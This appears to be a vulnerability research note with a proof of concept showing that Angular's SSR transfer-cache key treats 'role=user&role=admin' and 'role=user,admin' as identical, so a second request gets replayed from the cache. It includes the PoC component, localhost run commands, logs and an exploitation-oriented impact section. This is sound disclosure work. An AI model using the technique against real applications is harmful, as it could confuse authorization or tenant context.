# A18 deterministic HttpParams collision

Date: 2026-04-30

## Goal

Look for a stronger A18 subcase that does not depend on brute-forcing the 32-bit hash.

## Finding

`makeCacheKey()` includes request params through:

```text
targets/angular/packages/common/http/src/transfer_cache.ts:315-319
```

```ts
function sortAndConcatParams(params: HttpParams | URLSearchParams): string {
  return [...params.keys()]
    .sort()
    .map((k) => `${k}=${params.getAll(k)}`)
    .join('&');
}
```

`params.getAll(k)` returns `string[]`. Template-string coercion calls `Array.prototype.toString()`,
which joins values with commas. Therefore these two different request parameter sets produce the
same transfer-cache key material:

```text
role=user&role=admin  -> getAll("role") = ["user", "admin"] -> role=user,admin
role=user,admin       -> getAll("role") = ["user,admin"]    -> role=user,admin
```

This is a deterministic pre-hash collision. It does not require searching the 32-bit hash space.

## PoC

File:

```text
bugs/angular/a18-transfer-cache-request-variant-confusion/poc/ssr-cookie-app/deterministic_params_collision_server.ts
```

The SSR component makes two same-URL requests:

```ts
const multiValue = new HttpParams({fromObject: {role: ['user', 'admin']}});
const commaValue = new HttpParams({fromObject: {role: 'user,admin'}});

http.get('/api/scope', {params: multiValue, responseType: 'text'});
http.get('/api/scope', {params: commaValue, responseType: 'text'});
```

The backend treats repeated values and a single comma-containing value differently:

```text
/api/scope?role=user&role=admin -> multi:user|admin
/api/scope?role=user,admin      -> scalar:user,admin
```

The backend also returns:

```text
Cache-Control: private, no-store
```

## Commands

```bash
cd bugs/angular/a18-transfer-cache-request-variant-confusion/poc/ssr-cookie-app
./node_modules/.bin/tsx deterministic_params_collision_server.ts
curl -sS 'http://127.0.0.1:4222/'
```

## Observed HTML

```html
<div id="scope">first=multi:user|admin|second=multi:user|admin</div>
```

Expected if the second request reached the backend:

```html
<div id="scope">first=multi:user|admin|second=scalar:user,admin</div>
```

Observed `ng-state`:

```json
{
  "800966273": {
    "b": "multi:user|admin",
    "h": {},
    "s": 200,
    "st": "OK",
    "u": "http://127.0.0.1:4222/api/scope",
    "rt": "text"
  }
}
```

## Observed server log

```text
[api] /api/scope hit 1 url= /api/scope?role=user&role=admin body= multi:user|admin
[ssr] first scope body: multi:user|admin
[ssr] second scope body: multi:user|admin
[express] api hit counts scope= 1
```

The second request `/api/scope?role=user,admin` did not reach the backend. Angular replayed the
cached repeated-param response.

## Impact interpretation

This makes the A18 primitive easier to exploit:

- no chosen 32-bit hash search is needed;
- the collision is caused by Angular's deterministic key construction;
- repeated query parameters and comma-containing scalar values are both common in web APIs;
- backends often treat repeated values and comma-delimited values differently for filters, scopes,
  roles, tenant selection, API versioning, or authorization context.

This is still same-render response confusion, not cross-render leakage by itself. It strengthens the
framework-owned root cause because two semantically different `HttpParams` requests collapse before
the 32-bit `StateKey` hash is even applied.
